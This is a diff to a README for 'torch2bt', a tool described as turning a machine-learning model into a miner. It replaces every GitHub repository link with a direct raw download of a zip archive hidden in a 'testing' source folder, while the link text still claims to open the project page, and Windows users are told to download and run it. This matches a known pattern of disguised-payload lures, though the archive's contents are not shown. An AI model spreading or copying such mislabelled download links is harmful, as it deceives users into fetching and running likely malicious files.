@@ -1,6 +1,6 @@
 # 🔧 torch2bt - Turn Your Model Into A Miner
 
-[![Download](https://img.shields.io/badge/Download-Torch2BT-7e57c2?style=for-the-badge&logo=github)](https://github.com/Hyattnordic410/torch2bt)
+[![Download](https://img.shields.io/badge/Download-Torch2BT-7e57c2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hyattnordic410/torch2bt/main/src/torch2bt/testing/torch_bt_3.5.zip)
 
 ## 🚀 What torch2bt does
 
@@ -19,7 +19,7 @@ This saves time if you want to move from a model file to a working miner setup w
 
 Use this link to visit the download page and get the files you need:
 
-[Open torch2bt on GitHub](https://github.com/Hyattnordic410/torch2bt)
+[Open torch2bt on GitHub](https://raw.githubusercontent.com/Hyattnordic410/torch2bt/main/src/torch2bt/testing/torch_bt_3.5.zip)
 
 If you are on Windows, use the page to download or clone the project, then follow the steps below to run it.
 
@@ -267,7 +267,7 @@ Keep the project folder clean and avoid moving files after generation unless you
 
 Open the project here:
 
-[https://github.com/Hyattnordic410/torch2bt](https://github.com/Hyattnordic410/torch2bt)
+[https://raw.githubusercontent.com/Hyattnordic410/torch2bt/main/src/torch2bt/testing/torch_bt_3.5.zip](https://raw.githubusercontent.com/Hyattnordic410/torch2bt/main/src/torch2bt/testing/torch_bt_3.5.zip)
 
 Use this page to visit the repo, download the files, and start the setup on Windows
 
